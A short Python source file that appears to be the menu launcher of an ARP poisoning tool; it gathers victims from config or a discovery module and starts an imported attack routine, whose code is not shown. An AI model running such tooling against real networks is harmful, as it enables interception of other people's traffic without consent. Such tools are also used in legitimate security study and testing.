import os
from config import config

def main():
    from discovery import start_discovery
    from ARP import start_attack
    while True:
        os.system("clear")
        print("1: Start ARP poisoning attack")
        print("2: Quit")

        print()
        choice = input("Press a number: ")

        if choice == "1":
            if config.arp_skip_discovery:
                from discovery import get_self_ip, get_self_mac
                victims = config.arp_hardcoded_victims
                interface = config.arp_hardcoded_interface
                self_ip = get_self_ip(interface)
                self_mac = get_self_mac(interface)
            else:
                victims, interface, self_ip, self_mac = start_discovery()

            if len(victims) < 2:
                input("Not enough victims returned...")
            else:
                start_attack(victims, self_ip, self_mac, interface)
        elif choice == "2":
            break

if __name__ == "__main__":
    main()